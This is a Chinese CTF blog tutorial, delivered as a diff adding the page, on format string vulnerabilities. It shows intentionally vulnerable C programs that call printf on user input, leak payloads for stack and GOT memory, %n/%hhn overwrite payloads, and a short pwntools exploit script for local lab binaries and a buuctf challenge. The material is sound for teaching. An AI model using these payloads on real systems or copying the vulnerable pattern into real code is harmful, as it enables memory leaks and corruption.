@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>格式化字符串 | Ep0ch</title><meta name="author" content="Zs"><meta name="copyright" content="Zs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="格式化字符串在堆学习的过程中 有点忘记格式化字符串的知识了 结合CTFWiKi上的知识总结一下 前言格式化字符串漏洞主要是由于程序不安全地使用格式化字符串函数（如C语言中的printf、sprintf、fprintf等）导致的。 常用的格式化字符串的含义  %p 打印栈上的数据‘ %s 将栈上的数据作为地址解析，打印解析后的数据 %x 以十六进制的方式打印  利用泄露内存泄露栈内存泄露内存可以泄露">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串">
+<meta property="og:url" content="http://example.com/posts/7fabda03/index.html">
+<meta property="og:site_name" content="Ep0ch">
+<meta property="og:description" content="格式化字符串在堆学习的过程中 有点忘记格式化字符串的知识了 结合CTFWiKi上的知识总结一下 前言格式化字符串漏洞主要是由于程序不安全地使用格式化字符串函数（如C语言中的printf、sprintf、fprintf等）导致的。 常用的格式化字符串的含义  %p 打印栈上的数据‘ %s 将栈上的数据作为地址解析，打印解析后的数据 %x 以十六进制的方式打印  利用泄露内存泄露栈内存泄露内存可以泄露">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/fmt.jpg">
+<meta property="article:published_time" content="2024-10-14T03:23:00.000Z">
+<meta property="article:modified_time" content="2024-10-14T03:26:33.251Z">
+<meta property="article:author" content="Zs">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/fmt.jpg"><link rel="shortcut icon" href="/img/index.jpg"><link rel="canonical" href="http://example.com/posts/7fabda03/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Zs","link":"链接: ","source":"来源: Ep0ch","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '格式化字符串',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-14 11:26:33'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/epoch.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fmt.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Ep0ch"><img class="site-icon" src="/img/epoch.jpg#%20image"/><span class="site-name">Ep0ch</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">格式化字符串</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-14T03:23:00.000Z" title="发表于 2024-10-14 11:23:00">2024-10-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-14T03:26:33.251Z" title="更新于 2024-10-14 11:26:33">2024-10-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="格式化字符串"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p>在堆学习的过程中 有点忘记格式化字符串的知识了 结合CTFWiKi上的知识总结一下</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>格式化字符串漏洞主要是由于程序不安全地使用格式化字符串函数（如C语言中的<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>等）导致的。</p>
+<p>常用的格式化字符串的含义</p>
+<ul>
+<li>%p 打印栈上的数据‘</li>
+<li>%s 将栈上的数据作为地址解析，打印解析后的数据</li>
+<li>%x 以十六进制的方式打印</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>泄露内存可以泄露栈内存来获取某个变量的值或某个变量对应地址的内存</p>
+<p>也可以与GOT表结合，泄露某个函数的实际地址，进而泄露libc版本，获取到其他libc函数的地址</p>
+<p>以CTFWiKi上的例子为例</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure>
+
+<p>编译后运行一下 输入<code>aaaa%x+%x+%x+%x</code>尝试获取栈上变量的数值</p>
+<p><img src="https://pic.imgdb.cn/item/670bc99bd29ded1a8c1a154f.png"></p>
+<p>确实得到了内容</p>
+<p>可以使用%n$x定向获取第n+1个参数的值</p>
+<p><img src="https://pic.imgdb.cn/item/670bca29d29ded1a8c1a8404.png"></p>
+<p>同时可以使用%s以及%n$s来获取栈变量对应的字符串以及定向获取第n+1个</p>
+<p>但需要栈上的值可以作为地址来解析</p>
+<p>在做题过程中一般直接使用%p</p>
+<h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>通过固定的偏移泄露某个libc函数的GOT表内容，进而得到这个函数的实际地址</p>
+<p>这里我们以buuctf上的一道题目为例</p>
+<p><a href="axb_2019_fmt32">https://buuoj.cn/challenges#axb_2019_fmt32</a></p>
+<p>checksec查看</p>
+<p><img src="https://pic.imgdb.cn/item/670c7b3cd29ded1a8c911051.png"></p>
+<p>开启了部分的RELRO保护，以及NX保护</p>
+<p>ida查看反编译代码</p>
+<p><img src="https://pic.imgdb.cn/item/670c7fc8d29ded1a8c958f72.png"></p>
+<p>运行输入<code>aaaa%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p+%p</code></p>
+<p><img src="https://pic.imgdb.cn/item/670c8076d29ded1a8c96336a.png"></p>
+<p>可以看到偏移为8</p>
+<p>那么我们便可以构造<code>payload = b&#39;a&#39; + p32(puts_got) + b&#39;%8$s&#39;</code>将printf_got的地址写到偏移为8的地方</p>
+<p>将printf的真实地址打印出来，进而泄露libc</p>
+<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>以CTFWiKi上的例子为例</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o overwrite overwrite.c</span><br></pre></td></tr></table></figure>
+
+<p>同样运行后输入</p>
+<p><img src="https://pic.imgdb.cn/item/670c84f2d29ded1a8c9a641e.png"></p>
+<p>发现偏移为6</p>
+<p>观察源程序发现输出的0xff940fdc处存放的时c变量的地址</p>
+<p>那么如果要修改c变量的值为18则构造***<code>payload = p32(c_addr) + &#39;%014d&#39; + b&#39;%6$n</code>***</p>
+<p>**<code>p32(c_addr)</code>**为4位</p>
+<p>**<code>&#39;%014d&#39;</code>**：用来生成一段14位的填充输出</p>
+<p>那么就会将18写入<strong>第 6 个参数所指向的地址</strong>（也就是 <code>c_addr</code>）。</p>
+<h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>同样是上面的例子，我们尝试将a处的值覆盖为2</p>
+<p>a,b时全局变量 在ida中可以找到它们的位置</p>
+<p><img src="https://pic.imgdb.cn/item/670c896fd29ded1a8c9e3c8e.png"></p>
+<p>那么我们可以构造**<code>payload = &#39;aa%8$naa&#39; + p32(a_addr)</code>**</p>
+<ul>
+<li><code>&#39;aa&#39;</code> 在 payload 中占用 2 个字符。</li>
+<li>后续使用 <code>%8$n</code> 进行攻击时，<code>printf()</code> 会计算<strong>总共已打印字符的数量</strong>，并将该数量写入目标地址。</li>
+<li><strong><code>%8$n</code></strong> 的作用是：将已打印字符数写入 <strong>第 8 个参数指向的地址</strong>。</li>
+<li>为了控制栈上第 8 个参数的位置，通常我们会在格式化字符串中放入一个<strong>目标地址</strong>，这就是为什么我们在 payload 的最后添加了 <code>p32(a_addr)</code>。这样，**<code>a_addr</code>** 成为栈上的第 8 个参数地址。</li>
+</ul>
+<p>即可实现成功覆盖</p>
+<h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</span><br><span class="line">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</span><br><span class="line">（解释的很抽象）</span><br></pre></td></tr></table></figure>
+
+<p>所以我们利用%hhn 向某个地址写入单字节，利用%hn向某个地址写入双字节</p>
+<p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">b_addr = <span class="number">0x0804C01C</span></span><br><span class="line">payload = p32(b_addr) + p32(b_addr+ <span class="number">1</span>) + p32(b_addr + <span class="number">2</span>) + p32(b_addr + <span class="number">3</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%104x&#x27;</span> + <span class="string">b&#x27;%6$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%7$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%8$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(fmtstr_payload(6, &#123;b_addr : 0x12345678&#125;))</span></span><br><span class="line"><span class="comment">#可以直接使用fmtstr_payload函数...</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一串payolad每个p32是4字节，一共是16字节</p>
+<p>那么算到%6$hhn前面就是：16 + 104 &#x3D; 120 十六进制0x78</p>
+<p>再加上222就是342 十六进制x0156</p>
+<p>依次是 0x234,0x312 hh写入单字节，并且是小端存储 所以对于三位只取后两位</p>
+<p>所以连起来就是0x12345678</p>
+<p>再记一下fmtstr_payload函数的用法</p>
+<p>函数原型：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>, strategy=<span class="string">&#x27;fast&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明：</strong></p>
+<ul>
+<li>**<code>offset</code>**：格式化字符串的偏移量，即第一个用户可控的输入在格式化字符串中的位置。通常通过<code>%x</code>逐个试探得出。</li>
+<li>**<code>writes</code>**：字典类型，键为待写入的内存地址，值为要写入的值。<br>例如：<code>&#123;0x804a00c: 0xdeadbeef&#125;</code> 表示将<code>0xdeadbeef</code>写入地址<code>0x804a00c</code>。</li>
+<li>**<code>numbwritten</code>**：可选参数，表示已经输出的字符数，这会影响剩余的填充长度。</li>
+<li>**<code>write_size</code>**：写入的粒度，取值为<code>&#39;byte&#39;</code>、<code>&#39;short&#39;</code>或<code>&#39;int&#39;</code>，分别表示以1字节、2字节或4字节为单位进行写入。</li>
+<li>**<code>strategy</code>**：<code>&#39;fast&#39;</code>或<code>&#39;filled&#39;</code>。<code>fast</code>用于生成较短的payload，而<code>filled</code>用于确保每次写入的长度对齐。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Zs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/7fabda03/">http://example.com/posts/7fabda03/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ep0ch</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/fmt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/fd137f81/" title="Syetem()与Execve()的区别"><img class="cover" src="/img/pwn1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-07</div><div class="title">Syetem()与Execve()的区别</div></div></a></div><div><a href="/posts/54d49677/" title="CISCN2023烧烤摊儿"><img class="cover" src="/img/PWNciscn.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-09</div><div class="title">CISCN2023烧烤摊儿</div></div></a></div><div><a href="/posts/d66b9a90/" title="BUUCTF 刮开有奖"><img class="cover" src="/img/tag.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-08</div><div class="title">BUUCTF 刮开有奖</div></div></a></div><div><a href="/posts/5286b664/" title="WEB刷一刷"><img class="cover" src="/img/web.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-10</div><div class="title">WEB刷一刷</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/epoch.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zs</div><div class="author-info__description">人山人海呀~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.</span> <span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98"><span class="toc-number">1.2.1.</span> <span class="toc-text">泄露内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">泄露栈内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">泄露任意地址内存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98"><span class="toc-number">1.2.2.</span> <span class="toc-text">覆盖内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">覆盖栈内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">覆盖任意地址内存</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">覆盖小数字</span></a></li><li class="toc-item 